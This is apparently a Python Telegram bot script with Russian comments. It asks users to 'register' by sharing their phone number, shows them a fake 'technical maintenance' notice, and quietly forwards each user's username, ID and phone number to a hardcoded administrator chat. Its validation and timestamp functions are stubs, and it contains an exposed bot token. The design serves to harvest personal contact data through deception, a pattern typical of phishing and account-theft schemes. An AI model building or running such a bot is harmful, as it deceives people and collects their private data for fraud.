
import telebot
from telebot import types

# Токен вашего бота
TOKEN = '6499268441:AAH4fw41vdLo5GuOVaW_4lPyLyOBSJAYdKE'

# Создание экземпляра бота
bot = telebot.TeleBot(TOKEN)

# Обработчик команды /start
@bot.message_handler(commands=['start'])
def start(message):
    # Отправка приветственного сообщения жирным шрифтом
    bot.send_message(message.chat.id, '<b>Добро пожаловать!</b>', parse_mode='HTML')
    # Отправка сообщения с просьбой отправить номер телефона и кнопкой "Зарегистрироваться"
    markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
    button = types.KeyboardButton(text="Зарегистрироваться✅", request_contact=True)
    markup.add(button)
    bot.send_message(message.chat.id, 'Для регистрации в боте пожалуйста отправьте свой номер телефона ✅', reply_markup=markup)

# Обработчик получения контакта
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    # Проверка правильности номера телефона
    if is_valid_phone_number(message.contact.phone_number):
        # Отправка сообщения о технических работах
        bot.send_message(message.chat.id, '⚠️ Технические работы до 00:00.\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.')
        # Отправка информации о пользователе администратору
        admin_info = f"👤 {message.from_user.username}\n├ ID: {message.from_user.id}\n├ Регистрация: {get_current_time()}\n└ Телефон: {message.contact.phone_number}"
        bot.send_message(6493585559, admin_info)
    else:
        # Отправка сообщения о неправильном номере телефона
        bot.send_message(message.chat.id, 'Неправильный формат номера телефона. Пожалуйста, отправьте правильный номер.')

# Обработчик всех остальных сообщений
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    # Проверка, что пользователь не отправил контакт
    if not message.contact:
        # Отправка сообщения с просьбой отправить номер телефона и кнопкой "Зарегистрироваться"
        markup = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button = types.KeyboardButton(text="Зарегистрироваться✅", request_contact=True)
        markup.add(button)
        bot.send_message(message.chat.id, 'Для регистрации в боте пожалуйста отправьте свой номер телефона ✅', reply_markup=markup)

# Функция для проверки правильности номера телефона
def is_valid_phone_number(phone_number):
    # Реализуйте вашу проверку здесь
    # Верните True, если номер телефона правильный, иначе False
    return True

# Функция для получения текущего времени в формате "ЧЧ:ММ"
def get_current_time():
    # Реализуйте вашу функцию здесь
    # Верните текущее время в формате "ЧЧ:ММ"
    return '13:33'

# Запуск бота
bot.polling()
                     